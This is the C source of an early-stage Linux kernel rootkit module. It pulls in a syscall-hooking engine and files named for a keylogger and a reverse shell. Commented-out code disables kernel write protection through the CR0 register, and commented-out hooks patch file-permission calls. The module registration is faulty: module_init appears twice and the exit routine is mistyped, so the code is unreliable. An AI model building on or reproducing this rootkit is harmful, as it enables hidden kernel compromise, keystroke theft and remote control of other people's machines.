/**
 * @file    rootkit.c
 * @author  Aaron Lichtman, Arch Gupta  and Brandon Weidner
 * @brief   A rootkit. TODO: Expand description
 */
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/file.h>
#include "khook/engine.c"
#include "arsenal/keylogger.c"
#include "arsenal/reverse-shell.c"

MODULE_AUTHOR("Aaron Lichtman");
MODULE_AUTHOR("Arch Gupta");
MODULE_AUTHOR("Brandon Weidner");
MODULE_DESCRIPTION("Linux rootkit.");
MODULE_VERSION("0.1");

// Look into module_param() and MODULE_PARM_DESC for adding parameters

// TODO: Figure out if this is needed at all.
// /**
//  * Overwrite the 16th bit in the CR0 register to disable write protection.
//  */
// void disable_write_protection() {
//     unsigned long value;
//     asm volatile("mov %%cr0,%0" : "=r"(value));
//     if (value & 0x00010000) {
//         value &= ~0x00010000;
//                 asm volatile("mov %0,%%cr0" ::"r"(value));
//     }
// }

// Hooking open syscall?
/**
KHOOK(fget);
static int khook_fget(unsigned int fd) {
    int original = KHOOK_ORIGIN(fget, fd);
    printk("%s(%d) = %d\n", __func__, fd, original);
    return original;
}

// Example hook for testing build process.
KHOOK(inode_permission);
static int khook_inode_permission(struct inode* inode, int mask) {
	int ret = 0;
	ret = KHOOK_ORIGIN(inode_permission, inode, mask);
	printk("%s(%p, %08x) = %d\n", __func__, inode, mask, ret);
	return ret;
}
**/

/**
 * Rootkit module initialization.
 */
static int __init rootkit_init(void) {
	printk(KERN_INFO "Initializing rootkit.\n");
	khook_init();
	return 0;
}

/**
 * Called at exit. All cleanup should be done here.
 */
static int __exit rootkit_exit(void) {
	printk(KERN_INFO "Cleaning up rootkit.\n");
	khook_cleanup();
	return 0;
}

module_init(rootkit_init);
module_init(rootkit_exit);
MODULE_LICENSE("GPL");
